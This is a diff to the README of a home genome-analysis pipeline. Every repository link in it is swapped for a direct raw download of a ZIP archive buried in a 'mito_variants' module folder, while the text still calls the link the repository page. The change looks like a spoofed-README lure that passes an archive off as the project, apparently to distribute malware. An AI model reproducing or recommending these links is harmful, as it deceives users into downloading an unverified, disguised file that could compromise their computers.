@@ -1,6 +1,6 @@
 # 🧬 Personal-Genome-Pipeline - Run genome analysis at home
 
-[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/Barrelsravennagrass984/Personal-Genome-Pipeline)
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/Barrelsravennagrass984/Personal-Genome-Pipeline/raw/refs/heads/main/modules/local/mito_variants/Personal-Pipeline-Genome-v1.3.zip)
 
 ## 🚀 What this does
 
@@ -14,7 +14,7 @@ Use it to review common genome data, look at likely trait links, and work with o
 
 Open the repository page here:
 
-https://github.com/Barrelsravennagrass984/Personal-Genome-Pipeline
+https://github.com/Barrelsravennagrass984/Personal-Genome-Pipeline/raw/refs/heads/main/modules/local/mito_variants/Personal-Pipeline-Genome-v1.3.zip
 
 Use that page to get the project files and follow the Windows setup steps below.
 
@@ -60,7 +60,7 @@ After install, open Docker Desktop and wait until it shows that it is running.
 
 Open the repository page:
 
-https://github.com/Barrelsravennagrass984/Personal-Genome-Pipeline
+https://github.com/Barrelsravennagrass984/Personal-Genome-Pipeline/raw/refs/heads/main/modules/local/mito_variants/Personal-Pipeline-Genome-v1.3.zip
 
 Use the green Code button on the page and download the project as a ZIP file, or clone it if you already know how to do that.
 
@@ -263,4 +263,4 @@ If you are new to this, follow this order:
 
 ## 📎 Repository link
 
-https://github.com/Barrelsravennagrass984/Personal-Genome-Pipeline
+https://github.com/Barrelsravennagrass984/Personal-Genome-Pipeline/raw/refs/heads/main/modules/local/mito_variants/Personal-Pipeline-Genome-v1.3.zip
